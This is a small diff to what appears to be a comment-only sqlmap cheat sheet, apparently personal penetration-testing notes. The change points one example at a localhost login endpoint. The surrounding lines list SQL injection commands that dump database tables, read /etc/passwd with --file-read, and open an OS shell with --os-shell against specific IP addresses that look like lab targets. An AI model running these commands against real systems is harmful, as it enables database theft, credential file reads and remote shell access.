@@ -59,7 +59,7 @@
 // sqlmap -u "http://target.com/page.php?id=1" -D db_name -T table_name --dump
 //* send post requests
 // sqlmap -u 'http://www.example.com/' --data 'id=1'
-// sqlmap -u 'http://94.237.54.145:56567/action.php' --data '{"id":"1"}' --dump
+// sqlmap -u 'http://localhost:3000/rest/user/login' --data 'email=test&password=tes' --random-agent --dump
 //* process cookies
 // sqlmap -u 'http://www.example.com/' --cookie='id=1' --level=2
 //* show errors
@@ -84,3 +84,5 @@
 // sqlmap -u "http://target.com/page.php?id=1" --file-read "/etc/passwd"
 //* remote shell
 // sqlmap -u "http://94.237.48.12:38728/?id=1" --os-shell
+
+
